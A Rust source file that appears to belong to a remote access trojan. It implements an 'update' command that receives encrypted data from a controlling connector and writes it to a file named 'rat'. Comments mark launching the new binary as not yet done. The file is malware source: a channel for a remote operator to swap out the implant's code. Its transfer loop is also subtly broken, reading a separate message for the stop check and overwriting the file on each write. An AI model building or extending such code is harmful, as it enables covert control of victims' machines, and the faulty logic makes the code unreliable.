use tokio::{
    fs::{self, OpenOptions},
    io::AsyncWriteExt,
};

use crate::connector::{hybrid_decryption::HybridDecryption, Connector};

use super::{Feature, Result};

pub struct Update {
    name: String,
}
impl Feature for Update {
    fn get_command(&self) -> String {
        "update".to_string()
    }
    async fn run(&self, connector: &mut Connector) -> Result {
        while connector.accept_encrypted_message().await != "stop_file_transfer" {
            fs::write("rat", connector.accept_encrypted_message().await.as_bytes())
                .await
                .unwrap();
        }
        //launch it

        //check if its running somehow idono
        Result::SUCCESFUL
    }
}
impl Update {
    pub fn new() -> Update {
        Update {
            name: "update".to_string(),
        }
    }
}
